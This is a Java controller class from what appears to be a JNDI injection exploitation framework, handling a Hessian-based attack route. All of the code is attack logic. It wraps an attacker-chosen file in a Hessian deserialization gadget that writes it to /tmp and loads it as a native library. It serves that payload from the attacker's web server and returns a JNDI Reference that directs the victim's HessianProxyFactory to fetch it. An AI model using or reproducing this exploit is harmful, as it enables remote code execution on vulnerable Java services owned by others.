package map.jndi.controller;

import map.jndi.Main;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.gadget.HessianGadgets;
import map.jndi.server.WebServer;
import map.jndi.util.MiscUtil;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Properties;

@JNDIController
@JNDIMapping("/Hessian/{interface}")
public class HessianController implements Controller {
    public Object process(Properties props) throws Exception {
        String interfaceName = props.getProperty("interface");
        String path = props.getProperty("path");

        System.out.println("[Hessian] Interface: " + interfaceName);

        String fileName = "/tmp/" + MiscUtil.getRandStr(8) + ".log";
        byte[] content = Files.readAllBytes(Paths.get(path));

        byte[] header = "HabF".getBytes();
        byte[] body = HessianGadgets.loadLibrary(fileName, content);

        byte[] payload = new byte[header.length + body.length];
        System.arraycopy(header, 0, payload, 0, header.length);
        System.arraycopy(body, 0, payload, header.length, body.length);

        String route = MiscUtil.getRandStr(8);
        WebServer.getInstance().serveFile("/" + route, payload);

        Reference ref = new Reference("test", "com.caucho.hessian.client.HessianProxyFactory", null);
        ref.add(new StringRefAddr("type", interfaceName));
        ref.add(new StringRefAddr("url", Main.config.codebase + route));

        return ref;
    }

    @JNDIMapping("/LoadLibrary/{path}")
    public Properties loadLibrary(String interfaceName, String path) {
        System.out.println("[Hessian] LoadLibrary Path: " + path);

        Properties props = new Properties();
        props.setProperty("interface", interfaceName);
        props.setProperty("path", path);

        return props;
    }
}
